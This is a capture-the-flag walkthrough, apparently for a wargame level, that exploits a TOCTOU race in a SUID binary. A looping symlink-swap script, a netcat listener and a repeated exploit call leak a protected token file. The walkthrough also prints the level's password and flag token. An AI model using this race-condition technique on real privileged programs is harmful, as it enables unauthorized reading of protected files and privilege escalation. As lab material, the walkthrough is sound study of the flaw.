1. List files in the directory:
   ll
   # Output shows: level10 binary with SUID permissions and token file owned by flag10

2. Test the binary behavior:
   ./level10 ~/token 127.0.0.1
   # Output: You don't have access to /home/user/level10/token

3. Create race condition script:
   vim /tmp/simbolic
   # Content:
   while true; do
       touch /tmp/flag
       rm -r /tmp/flag
       ln -s ~/token /tmp/flag
       rm -r /tmp/flag
   done

4. Execute race condition attack using 3 shells:

   #Shell 1 - Race condition
   chmod +x /tmp/simbolic
   /tmp/simbolic

   #Shell 2 - Netcat listener
   nc -lk 6969
   # Receives multiple ".*( )*." messages and eventually:
   # woupa2yuojeeaaed06riuj63c

   #Shell 3 - Exploit loop
   while true; do ./level10 /tmp/flag 127.0.0.1; done

5. Login as flag10:
   su flag10
   # Password: woupa2yuojeeaaed06riuj63c
   # Don't forget to launch getflag !

6. Get the flag:
   getflag
   # Output: Check flag.Here is your token : feulo4b72j7edeahuete3no7c

TECHNIQUE: Race condition attack on TOCTOU vulnerability
VULNERABILITY: Time-of-check to time-of-use (TOCTOU) in file access validation
ATTACK: Symbolic link switching between accessible and restricted files
PASSWORD: woupa2yuojeeaaed06riuj63c
TOKEN: feulo4b72j7edeahuete3no7c
